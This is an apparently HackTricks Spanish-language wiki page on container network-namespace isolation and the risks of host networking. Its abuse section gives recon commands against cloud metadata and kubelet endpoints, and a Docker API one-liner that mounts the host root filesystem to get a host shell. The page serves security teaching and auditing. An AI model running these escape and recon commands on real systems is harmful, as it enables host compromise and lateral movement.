# Espacio de nombres de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Visión general

El network namespace aisla recursos relacionados con la red como interfaces, direcciones IP, tablas de enrutamiento, estado ARP/neighbor, reglas de firewall, sockets y el contenido de archivos como `/proc/net`. Por eso un container puede tener lo que parece su propio `eth0`, sus propias rutas locales y su propio dispositivo loopback sin poseer la pila de red real del host.

Desde el punto de vista de seguridad, esto importa porque el aislamiento de red es mucho más que port binding. Un namespace de red privado limita lo que el workload puede observar o reconfigurar directamente. Una vez que ese namespace se comparte con el host, el container puede de repente obtener visibilidad sobre listeners del host, servicios locales del host y puntos de control de red que nunca debieron exponerse a la aplicación.

## Funcionamiento

Un network namespace recién creado comienza con un entorno de red vacío o casi vacío hasta que se le adjuntan interfaces. Los container runtimes luego crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que el workload tenga la conectividad esperada. En despliegues basados en bridge, esto suele significar que el container ve una interfaz respaldada por veth conectada a un host bridge. En Kubernetes, los plugins CNI se encargan de la configuración equivalente para la red de Pods.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` es un cambio tan dramático. En lugar de recibir una pila de red privada preparada, el workload se une a la real del host.

## Laboratorio

Puedes ver un network namespace casi vacío con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar contenedores normales y contenedores con la red del host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El contenedor conectado a la red del host ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo ya es significativo antes incluso de preguntar qué capacidades tiene el proceso.

## Uso en tiempo de ejecución

Docker y Podman normalmente crean un espacio de nombres de red privado para cada contenedor a menos que se configure lo contrario. Kubernetes suele dar a cada Pod su propio espacio de nombres de red, compartido por los contenedores dentro de ese Pod pero separado del host. Los sistemas Incus/LXC también proporcionan un aislamiento sólido basado en espacios de nombres de red, a menudo con una mayor variedad de configuraciones de red virtual.

El principio común es que la red privada es la frontera de aislamiento por defecto, mientras que usar la red del host es una exclusión explícita de esa frontera.

## Malconfiguraciones

La malconfiguración más importante es simplemente compartir el espacio de nombres de red del host. A veces se hace por rendimiento, monitorización a bajo nivel o conveniencia, pero elimina una de las fronteras más limpias disponibles para los contenedores. Los listeners locales del host pasan a ser accesibles de forma más directa, los servicios accesibles solo desde localhost pueden volverse alcanzables, y capacidades como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas porque las operaciones que habilitan se aplican ahora al propio entorno de red del host.

Otro problema es conceder en exceso capacidades relacionadas con la red incluso cuando el espacio de nombres de red es privado. Un espacio de nombres privado ayuda, pero no hace inofensivos los raw sockets ni el control avanzado de red.

En Kubernetes, `hostNetwork: true` también cambia la confianza que puedes tener en la segmentación de red a nivel de Pod. Kubernetes documenta que muchos plugins de red no pueden distinguir correctamente el tráfico de Pods con `hostNetwork` para el emparejamiento `podSelector` / `namespaceSelector` y por lo tanto lo tratan como tráfico ordinario del nodo. Desde el punto de vista de un atacante, eso significa que una carga de trabajo `hostNetwork` comprometida suele tener que tratarse como un punto de apoyo de red a nivel de nodo en lugar de como un Pod normal aún sujeto a las mismas suposiciones de políticas que las cargas de trabajo en overlay-network.

## Abuso

En entornos débilmente aislados, un atacante puede inspeccionar los servicios en escucha del host, alcanzar endpoints de administración ligados únicamente a loopback, capturar paquetes o interferir con el tráfico según las capacidades y el entorno, o reconfigurar el enrutamiento y el estado del firewall si `CAP_NET_ADMIN` está presente. En un clúster, esto también puede facilitar el movimiento lateral y el reconocimiento del plano de control.

Si sospechas que se está usando la red del host, comienza confirmando que las interfaces y listeners visibles pertenecen al host y no a una red de contenedor aislada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los servicios accesibles solo desde loopback suelen ser el primer hallazgo interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si las capacidades de red están presentes, pruebe si la carga de trabajo puede inspeccionar o alterar la pila visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En kernels modernos, host networking junto con `CAP_NET_ADMIN` también pueden exponer la ruta de los paquetes más allá de simples cambios en `iptables` / `nftables`. Los qdiscs y filtros de `tc` también son namespace-scoped, así que en un shared host network namespace se aplican a las interfaces del host que el contenedor puede ver. Si además está presente `CAP_BPF`, los programas eBPF relacionados con la red, como los loaders de TC y XDP, también se vuelven relevantes:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Esto importa porque un atacante podría ser capaz de espejar, redirigir, controlar (shape) o descartar tráfico a nivel de la interfaz del host, y no solo reescribir las reglas del firewall. En un espacio de nombres de red privado esas acciones quedan contenidas a la vista del contenedor; en un espacio de nombres de host compartido se convierten en acciones con impacto en el host.

En entornos de clúster o en la nube, el host networking también justifica un recon local rápido de metadata y de servicios adyacentes al plano de control:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Ejemplo completo: Host Networking + Local Runtime / Kubelet Access

Host networking no proporciona automáticamente acceso root al host, pero a menudo expone servicios que están intencionadamente accesibles solo desde el propio nodo. Si uno de esos servicios está débilmente protegido, Host networking se convierte en una vía directa de privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una API de runtime local está expuesta sin la protección adecuada
- reconocimiento del clúster o movimiento lateral si kubelet o agentes locales son alcanzables
- manipulación del tráfico o denegación de servicio cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es determinar si el proceso tiene una pila de red privada, qué rutas y sockets en escucha son visibles, y si la vista de red ya se parece a la del host antes de que siquiera pruebes las capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Lo interesante aquí:

- Si `/proc/self/ns/net` y `/proc/1/ns/net` ya parecen del host, el contenedor puede estar compartiendo el espacio de nombres de red del host u otro espacio de nombres no privado.
- `lsns -t net` y `ip netns identify` son útiles cuando el shell ya está dentro de un namespace nombrado o persistente y quieres correlacionarlo con los objetos `/run/netns` desde el lado del host.
- `ss -lntup` es especialmente valioso porque revela listeners sólo en loopback y endpoints de gestión locales.
- Las rutas, los nombres de interfaz, el contexto del firewall, el estado de `tc` y las vinculaciones eBPF cobran mucha más importancia si `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF` están presentes.
- En Kubernetes, la resolución fallida de nombres de servicio desde un Pod con `hostNetwork` puede simplemente significar que el Pod no está usando `dnsPolicy: ClusterFirstWithHostNet`, no que el servicio esté ausente.

Al revisar un contenedor, siempre evalúa el espacio de nombres de red junto con el conjunto de capacidades. El uso de la red del host combinado con capacidades de red potentes es una postura muy diferente a la de la red en bridge combinada con un conjunto de capacidades por defecto restringido.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
